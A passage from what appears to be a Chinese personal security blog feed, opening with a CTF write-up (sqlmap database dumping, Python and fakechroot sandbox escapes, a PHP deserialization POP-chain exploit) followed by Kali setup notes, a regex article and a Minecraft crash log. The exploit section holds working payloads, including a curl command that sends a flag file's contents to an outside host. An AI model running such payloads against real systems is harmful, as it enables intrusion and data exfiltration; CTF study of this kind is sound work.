4）UNION query</p><p>sqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a> -b –current-db –current-user</p><p>得到结果:current user: ‘root@localhost’ current database: ‘geek_sql’</p><p>进而sqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a> -D geek_sql -tables</p><p>得到：retrieved: ‘blog’ retrieved: ‘fllllag’</p><p>此时我们得知数据库名和表名，接下来就是爆内容</p><p>使用:sqlmap -u <a href="http://49.234.224.119:7415/?id=1">http://49.234.224.119:7415/?id=1</a> –dump -D geek_sql -T fllllag 得到: id fllllllag 1 welcome_to_syclover 2 longlone_need_gf 3 SYC{liuzhuang_4s_@_G00d_m@n}</p><h3 id="Web-FamilyJailPackage"><a href="#Web-FamilyJailPackage" class="headerlink" title="Web-FamilyJailPackage"></a>Web-FamilyJailPackage</h3><pre><code>You know some birds are not meant to be caged, their feathers just too bright. ---- The Shawshank Redemption</code></pre><p>典型沙箱逃逸，第一层python逃逸，第二层nodejs逃逸，第三层fakechroot逃逸，第一个直接在freebuf抄别人源码</p><pre><code>getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;ls&#39;)getattr(getattr(__builtins__, &#39;__tropmi__&#39;[::-1])(&#39;so&#39;[::-1]), &#39;metsys&#39;[::-1])(&#39;cat flag&#39;)ssh nodejs@server.com -p 2222password: nodejsqwqwqwqref:https://www.freebuf.com/articles/network/203208.htmlref:https://www.youtube.com/watch?v=EMYiGC9ZobY</code></pre><p>第二个nodejs难度极大，没接触过，去网上找各种参考</p><p><img src="http://106.15.74.181/wp-content/uploads/2020/11/1-1024x170.jpg"></p><p>瞎搞反正我也不太懂JS，参考了</p><p>nodejs ref:<a href="https://www.youtube.com/watch?v=-RnGbbIwTa8">https://www.youtube.com/watch?v=-RnGbbIwTa8</a></p><p>最后一个，其实不难，两行秒杀，只可惜容易让人摸不到头脑，但是也有提示了，文件含有fakechroot</p><p>暴露了环境信息</p><pre><code>https://manpages.debian.org/jessie/fakechroot/fakechroot.1.en.htmlhttps://github.com/dex4er/fakechroot/issues/64env ls /env cat /flagSYC&#123;you_r_re@lly_good_at_jailbreaking&#125;</code></pre><h3 id="Web-EpicPOPChain"><a href="#Web-EpicPOPChain" class="headerlink" title="Web-EpicPOPChain"></a>Web-EpicPOPChain</h3><p>这题直接非预期好吧</p><pre><code>&lt;?php//error_reporting(0);​​class pop&#123;    public $aaa;​    public static $bbb = false;​    public function __wakeup()    &#123;        echo &quot;bypass failure&quot;;        //Do you know CVE?        echo &quot;The class pop should never be serialized.&quot;;        $this-&gt;aaa = NULL;    &#125;​    public function __destruct()    &#123;        echo &quot;i will die\n&quot;;        for ($i=0; $i&lt;2; $i++) &#123; //exec();            var_dump(self::$bbb);            if (self::$bbb) &#123;                echo &quot;i have run the specific func&quot;;                $this-&gt;aaa[1]($this-&gt;aaa[2]);//如果bbb为真 则执行变量的函数方法            &#125; else &#123;                echo &quot;i have NOT run the specific func&quot;;                self::$bbb = call_user_func($this-&gt;aaa[&quot;object&quot;]);//执行用户自定义函数切无参数传递                                                                       //这里主要的问题就是calluserfunc相当于是在外部调用了函数                                                                       //说白了 此处就是要调用 getAFKL            &#125;        &#125;    &#125;&#125;​class chain&#123;  ​    private $AFKL=true;​    private function getAFKL()    &#123;        echo &quot;i have return true&quot;;        return $this-&gt;AFKL;    &#125;     public function __set($name,$para)    &#123;        $this-&gt;AFKL=$para;    &#125;&#125;​class epic extends chain&#123;    public $aaa;​​    public static $bbb = false;​    public function __invoke()    &#123;        return self::$bbb;    &#125;​    public function __call($name, $params)    &#123;        return $this-&gt;aaa-&gt;$name($params);            &#125;&#125;​if (isset($_GET[&quot;code&quot;])) &#123;    unserialize(base64_decode($_GET[&quot;code&quot;]));&#125; else &#123;   // highlight_file(__FILE__);&#125;​​$a=new pop;​$a-&gt;aaa=array(&quot;1&quot;=&gt;&#39;exec&#39;,&quot;2&quot;=&gt;&#39;curl --data &quot;dir=$(cat ../../../flag)&quot; http://106.15.74.181/curl.php&#39;,&#39;object&#39;=&gt;&#39;time&#39;);echo serialize($a);echo &quot;\n&quot;;​//$b=&#39;O:3:&quot;pop&quot;:2:&#123;s:3:&quot;aaa&quot;;a:3:&#123;i:1;s:4:&quot;exec&quot;;i:2;s:67:&quot;curl --data &quot;dir=$(ls -la ../../../)&quot; http://106.15.74.181/curl.php&quot;;s:6:&quot;object&quot;;s:4:&quot;time&quot;;&#125;&#125;&#39;;$b=&#39;O:3:&quot;pop&quot;:2:&#123;s:3:&quot;aaa&quot;;a:3:&#123;i:1;s:4:&quot;exec&quot;;i:2;s:68:&quot;curl --data &quot;dir=$(cat ../../../flag)&quot; http://106.15.74.181/curl.php&quot;;s:6:&quot;object&quot;;s:4:&quot;time&quot;;&#125;&#125;&#39;;//echo base64_encode($b);//TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjQ6ImV4ZWMiO2k6MjtzOjY3OiJjdXJsIC0tZGF0YSAiZGlyPSQobHMgLWxhIC4uLy4uLy4uLykiIGh0dHA6Ly8xMDYuMTUuNzQuMTgxL2N1cmwucGhwIjtzOjY6Im9iamVjdCI7czo0OiJ0aW1lIjt9fQ==echo base64_encode($b);//TzozOiJwb3AiOjI6e3M6MzoiYWFhIjthOjM6e2k6MTtzOjQ6ImV4ZWMiO2k6MjtzOjY4OiJjdXJsIC0tZGF0YSAiZGlyPSQoY2F0IC4uLy4uLy4uL2ZsYWcpIiBodHRwOi8vMTA2LjE1Ljc0LjE4MS9jdXJsLnBocCI7czo2OiJvYmplY3QiO3M6NDoidGltZSI7fX0==​</code></pre><p>主要知识点 call_user_func虽然看名字是调用用户定义函数，但实际上调用系统内置函数也是可以的，所以利用time值为正，属于真，就可以RCE啦</p><p>虽然很累但是收获不小，以此WP记录熬夜的那段时间</p><p><strong>2020.11.19</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h3 id=&quot;Web-Welcome&quot;&gt;&lt;a href=&quot;#Web-Welcome&quot; class=&quot;headerlink&quot; title=&quot;Web-Welcome&quot;&gt;&lt;/a&gt;Web-Welcome&lt;/h3&gt;&lt;p&gt;这道题emm估计给不少马虎的人当头一棒，诶</summary>
      
    
    
    
    <category term="Web" scheme="https://zwh-china.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>kali升级</title>
    <link href="https://zwh-china.github.io/2020/11/15/kali%E5%8D%87%E7%BA%A7/"/>
    <id>https://zwh-china.github.io/2020/11/15/kali%E5%8D%87%E7%BA%A7/</id>
    <published>2020-11-14T20:16:07.000Z</published>
    <updated>2021-04-20T21:15:38.451Z</updated>
    
    <content type="html"><![CDATA[<p>apt update &amp;&amp; apt full-upgrade</p><p>如果安装过程中意外终止则使用</p><p>dpkg –configure -a</p><p>查看系统版本</p><p>lsb_release -a</p><p>PS.记得把好看的壁纸保存了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;apt update &amp;amp;&amp;amp; apt full-upgrade&lt;/p&gt;
&lt;p&gt;如果安装过程中意外终止则使用&lt;/p&gt;
&lt;p&gt;dpkg –configure -a&lt;/p&gt;
&lt;p&gt;查看系统版本&lt;/p&gt;
&lt;p&gt;lsb_release -a&lt;/p&gt;
&lt;p&gt;PS.记得把好</summary>
      
    
    
    
    <category term="计算机知识" scheme="https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>kali换语言</title>
    <link href="https://zwh-china.github.io/2020/11/15/kali%E6%8D%A2%E8%AF%AD%E8%A8%80/"/>
    <id>https://zwh-china.github.io/2020/11/15/kali%E6%8D%A2%E8%AF%AD%E8%A8%80/</id>
    <published>2020-11-14T20:13:40.000Z</published>
    <updated>2021-04-20T21:15:38.449Z</updated>
    
    <content type="html"><![CDATA[<p>dpkg-reconfigure locales</p><p>找到对应语言按空格，把原来语言也按空格进行反选，确认，重启，生效。</p><p>另：apt是dpkg升级版，apt基于dpkg</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;dpkg-reconfigure locales&lt;/p&gt;
&lt;p&gt;找到对应语言按空格，把原来语言也按空格进行反选，确认，重启，生效。&lt;/p&gt;
&lt;p&gt;另：apt是dpkg升级版，apt基于dpkg&lt;/p&gt;
</summary>
      
    
    
    
    <category term="计算机知识" scheme="https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>kali换源</title>
    <link href="https://zwh-china.github.io/2020/11/15/kali%E6%8D%A2%E6%BA%90/"/>
    <id>https://zwh-china.github.io/2020/11/15/kali%E6%8D%A2%E6%BA%90/</id>
    <published>2020-11-14T20:10:29.000Z</published>
    <updated>2021-04-20T21:15:38.448Z</updated>
    
    <content type="html"><![CDATA[<p>转自:<a href="https://blog.csdn.net/claytang/article/details/79384318">https://blog.csdn.net/claytang/article/details/79384318</a></p><p>以root身份 vi  /etc/apt/sources.list</p><p>#中科大<br>deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p><p>#浙大<br>deb <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free<br>deb-src <a href="http://mirrors.zju.edu.cn/kali">http://mirrors.zju.edu.cn/kali</a> kali-rolling main contrib non-free</p><p>#东软大学<br>deb <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib<br>deb-src <a href="http://mirrors.neusoft.edu.cn/kali">http://mirrors.neusoft.edu.cn/kali</a> kali-rolling/main non-free contrib</p><p>#重庆大学<br>deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p><p>#官方源<br>#deb <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib<br>#deb-src <a href="http://http.kali.org/kali">http://http.kali.org/kali</a> kali-rolling main non-free contrib</p><p>使用旧版kali经常会发生apt-get update 报错 -GPG error， invalid key</p><p>解决方法： 下载最新key添加到keylist</p><p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc">https://archive.kali.org/archive-key.asc</a>  apt-key add</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;转自:&lt;a href=&quot;https://blog.csdn.net/claytang/article/details/79384318&quot;&gt;https://blog.csdn.net/claytang/article/details/79384318&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以</summary>
      
    
    
    
    <category term="计算机知识" scheme="https://zwh-china.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>转-Python正则表达式匹配反斜杠问题</title>
    <link href="https://zwh-china.github.io/2020/11/10/%E8%BD%AC%E8%BD%BDpython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D%E5%8F%8D%E6%96%9C%E6%9D%A0%E9%97%AE%E9%A2%98/"/>
    <id>https://zwh-china.github.io/2020/11/10/%E8%BD%AC%E8%BD%BDpython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D%E5%8F%8D%E6%96%9C%E6%9D%A0%E9%97%AE%E9%A2%98/</id>
    <published>2020-11-10T14:52:06.000Z</published>
    <updated>2021-04-20T21:15:38.446Z</updated>
    
    <content type="html"><![CDATA[<p>转载自csdnblog：<a href="http://blog.csdn.net/jinixin/article/details/56705284"><strong>Python****正则</strong>表达式<strong>匹配</strong>反斜杠’*<em>\*</em>‘问题</a></p><p>在学习<strong>Python****正则</strong>式的过程中，有一个问题一直困扰我，如何去<strong>匹配</strong>一个反斜杠（即“**\**”）？</p><p>一、引入</p><p>在学习了<strong>Python</strong>特殊字符和原始字符串之后，我觉得答案应该是这样的：<br>1）普通字符串：’**\*<strong><em>\*</em>‘<br>2）原始字符串：r’<strong>\**’<br>但事实上在提取诸如“3</strong>\**8”反斜杠之前的数字时，我屡次碰壁，始终得不到结果。最终发现自己理解错了，原来原始字符串和“</strong>正则**转义”没有一点关系；下面详细谈一谈。</p><p>二、字符串转义</p><p>反斜杠，在<strong>Python</strong>中比较特殊，就是它可以用来构成一些特殊字符，比如“<strong>\<strong>n”表示换行，“</strong>\**t”表示制表符。下面是使用“</strong>\**n”的一行代码：  </p><p>&gt;&gt;&gt;print (‘Hello**\<strong>World</strong>\**nPython’ )</p><p>结果为：<br>“Hello<strong>\<strong>World<br><strong>Python</strong>“<br>可以看到其中的“</strong>\**n”已转义为换行符，而“</strong>\<strong>W”没有发生转义，原因是“</strong>\**W”在“字符串转义”中并不对应着特殊字符，没有特殊含义。</p><p>如果现在要求变了，要求不对“<strong>\<strong>n”转义为换行，而是原封不动输出为“Hello</strong>\**World</strong>\**nPython”，该怎么办呢？</p><p>1）可以这样写“Hello**\<strong>World</strong>\****\<strong>nPython”，这样输出的时候，“字符串转义”会把“</strong>\****\<strong>”转义为“</strong>\**”；<br>2）也可使用另一种方法：原始字符串；原始字符串（即r’…’）：字符串中所有字符都直接按照字面意思来使用，不转义特殊字符。<br>下面是使用原始字符串的代码：</p><p>print r’Hello**\<strong>World</strong>\**nPython’ </p><p>结果为：<br>“Hello<strong>\<strong>World</strong>\**nPython”<br>可以清楚看到，在使用原始字符串之后，“</strong>\**n”未被转义为换行符，而是直接被输出了。</p><p>三、<strong>正则</strong>转义</p><p>好了，上面讲的只是“字符串转义”。同理，在<strong>正则</strong>表达式中也存在转义，我们姑且先称其为“<strong>正则</strong>转义”，其与“字符串转义”完全不同，比如“<strong>\<strong>d”代表数字，“</strong>\**s”代表空白符。下面我们先编写开头的例子，然后再分析。<br>提取“3</strong>\**8”反斜杠之前的数字：</p><p>#!/usr/bin/env python</p><h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import re</p><p>string = ‘3\8’<br>m = re.search(‘(\d+)\\\\‘, string)</p><p>if m is not None:<br>    print m.group(1)  # 结果为：3</p><p>n = re.search(r’(\d+)\\‘, string)</p><p>if n is not None:<br>    print n.group(1)  # 结果为：3</p><p><strong>正则</strong>表达式字符串需要经过两次转义，这两次分别是上面的“字符串转义”和“<strong>正则</strong>转义”，个人认为“字符串转义”一定先于“<strong>正则</strong>转义”。</p><p>1）’**\****\****\*<strong><em>\*</em>‘的过程：<br>先进行“字符串转义”，前两个反斜杠和后两个反斜杠分别被转义成了一个反斜杠；即“</strong>\**<strong>\*<strong>*\*<strong>*\<strong>”被转成了“</strong>\*<strong>*\<strong>”（“”为方便看清，请自动忽略）。“字符串转义”后马上进行“</strong>正则</strong>转义”，“</strong>\*<em><strong>\<strong>”被转义为了“</strong>\**”，表示该</strong>正则</em>*式需要</strong>匹配</strong>一个反斜杠。</p><p>2）r’<strong>\*<strong><em>\*</em>‘的过程：<br>由于原始字符串中所有字符直接按照字面意思来使用，不转义特殊字符，故不做“字符串转义”，直接进入第二步“</strong>正则**转义”，在</strong>正则<strong>转义中“</strong>\*<strong>*\<strong>”被转义为了“</strong>\<strong>”，表示该</strong>正则</strong>式需要<strong>匹配</strong>一个反斜杠。</p><p>四、结论</p><p>也就是说原始字符串（即r’…’）与“<strong>正则</strong>转义”毫无关系，原始字符串仅在“字符串转义”中起作用，使字符串免去一次转义。</p><p>ref:<a href="https://www.cnblogs.com/Anesthesia-is/articles/11503398.html">https://www.cnblogs.com/Anesthesia-is/articles/11503398.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;转载自csdnblog：&lt;a href=&quot;http://blog.csdn.net/jinixin/article/details/56705284&quot;&gt;&lt;strong&gt;Python****正则&lt;/strong&gt;表达式&lt;strong&gt;匹配&lt;/strong&gt;反斜杠’*&lt;em&gt;\</summary>
      
    
    
    
    <category term="Python学习" scheme="https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>记录一次MC服务器崩溃</title>
    <link href="https://zwh-china.github.io/2020/11/01/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1mc%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B4%A9%E6%BA%83/"/>
    <id>https://zwh-china.github.io/2020/11/01/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1mc%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B4%A9%E6%BA%83/</id>
    <published>2020-11-01T10:23:55.000Z</published>
    <updated>2021-04-20T21:15:38.445Z</updated>
    
    <content type="html"><![CDATA[<p>崩溃日志如下</p><p>-— Minecraft Crash Report —-<br>// You’re mean.</p><p>Time: 11/1/20 5:56 PM<br>Description: Watching Server</p><p>java.lang.Error<br>at java.util.stream.IntPipeline$4$1.accept(Unknown Source)<br>at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)<br>at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)<br>at java.util.stream.AbstractPipeline.copyInto(Unknown Source)<br>at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)<br>at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)<br>at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)<br>at java.util.stream.ReferencePipeline$Head.forEach(Unknown Source)<br>at java.util.stream.ReferencePipeline$7$1.accept(Unknown Source)<br>at java.util.stream.StreamSpliterators$WrappingSpliterator$$Lambda$1630/1997267152.accept(Unknown Source)<br>at java.util.stream.IntPipeline$4$1.accept(Unknown Source)<br>at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)<br>at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)<br>at java.util.stream.AbstractPipeline.copyInto(Unknown Source)<br>at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)<br>at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)<br>at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)<br>at java.util.stream.AbstractPipeline.copyInto(Unknown Source)<br>at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)<br>at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(Unknown Source)<br>at java.util.stream.AbstractPipeline.evaluate(Unknown Source)<br>at java.util.stream.ReferencePipeline.collect(Unknown Source)<br>at boo.b(SourceFile:112)<br>at acs.a(SourceFile:187)<br>at aba.c(SourceFile:111)<br>at aba.b(SourceFile:63)<br>at nd.a(SourceFile:230)<br>at aax.c(SourceFile:173)<br>at net.minecraft.server.MinecraftServer.b(SourceFile:879)<br>at zg.b(SourceFile:303)<br>at net.minecraft.server.MinecraftServer.a(SourceFile:808)<br>at net.minecraft.server.MinecraftServer.w(SourceFile:667)<br>at net.minecraft.server.MinecraftServer.a(SourceFile:254)<br>at net.minecraft.server.MinecraftServer$$Lambda$3304/1905868474.run(Unknown Source)<br>at java.lang.Thread.run(Unknown Source)</p><h2 id="A-detailed-walkthrough-of-the-error-its-code-path-and-all-known-details-is-as-follows"><a href="#A-detailed-walkthrough-of-the-error-its-code-path-and-all-known-details-is-as-follows" class="headerlink" title="A detailed walkthrough of the error, its code path and all known details is as follows:"></a>A detailed walkthrough of the error, its code path and all known details is as follows:</h2><p>-- Head –<br>Thread: Server Watchdog<br>Stacktrace:<br>at java.util.stream.IntPipeline$4$1.accept(Unknown Source)<br>at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)<br>at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)<br>at java.util.stream.AbstractPipeline.copyInto(Unknown Source)<br>at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)<br>at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)<br>at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)<br>at java.util.stream.ReferencePipeline$Head.forEach(Unknown Source)<br>at java.util.stream.ReferencePipeline$7$1.accept(Unknown Source)<br>at java.util.stream.StreamSpliterators$WrappingSpliterator$$Lambda$1630/1997267152.accept(Unknown Source)<br>at java.util.stream.IntPipeline$4$1.accept(Unknown Source)<br>at java.util.stream.Streams$RangeIntSpliterator.forEachRemaining(Unknown Source)<br>at java.util.Spliterator$OfInt.forEachRemaining(Unknown Source)<br>at java.util.stream.AbstractPipeline.copyInto(Unknown Source)<br>at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)<br>at java.util.stream.StreamSpliterators$WrappingSpliterator.forEachRemaining(Unknown Source)<br>at com.google.common.collect.CollectSpliterators$1WithCharacteristics.forEachRemaining(CollectSpliterators.java:65)<br>at java.util.stream.AbstractPipeline.copyInto(Unknown Source)<br>at java.util.stream.AbstractPipeline.wrapAndCopyInto(Unknown Source)<br>at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(Unknown Source)<br>at java.util.stream.AbstractPipeline.evaluate(Unknown Source)<br>at java.util.stream.ReferencePipeline.collect(Unknown Source)<br>at boo.b(SourceFile:112)<br>at acs.a(SourceFile:187)<br>at aba.c(SourceFile:111)<br>at aba.b(SourceFile:63)<br>at nd.a(SourceFile:230)<br>at aax.c(SourceFile:173)<br>at net.minecraft.server.MinecraftServer.b(SourceFile:879)<br>at zg.b(SourceFile:303)<br>at net.minecraft.server.MinecraftServer.a(SourceFile:808)<br>at net.minecraft.server.MinecraftServer.w(SourceFile:667)<br>at net.minecraft.server.MinecraftServer.a(SourceFile:254)</p><p>-- Thread Dump –<br>Details:<br>Threads: “Netty Server IO #63” Id=733 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #62” Id=732 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #61” Id=731 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #60” Id=730 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #59” Id=729 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #58” Id=728 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #57” Id=727 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #56” Id=726 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAdded0(DefaultChannelPipeline.java:637)<br>at io.netty.channel.DefaultChannelPipeline.access$000(DefaultChannelPipeline.java:46)<br>at io.netty.channel.DefaultChannelPipeline$PendingHandlerAddedTask.execute(DefaultChannelPipeline.java:1487)<br>at io.netty.channel.DefaultChannelPipeline.callHandlerAddedForAllHandlers(DefaultChannelPipeline.java:1161)<br>…</p><p>“Netty Server IO #55” Id=725 BLOCKED on java.util.Collections$SynchronizedRandomAccessList@206966ed owned by “Server thread” Id=40<br>at java.util.Collections$SynchronizedCollection.add(Unknown Source)<br>- blocked on java.util.Collections$SynchronizedRandomAccessList@206966ed<br>at aax$1.initChannel(SourceFile:108)<br>at io.netty.channel.ChannelInitializer.initChannel(ChannelInitializer.java:113)<br>at io.netty.channel.ChannelInitializer.handlerAdded(ChannelInitializer.java:105)<br>at 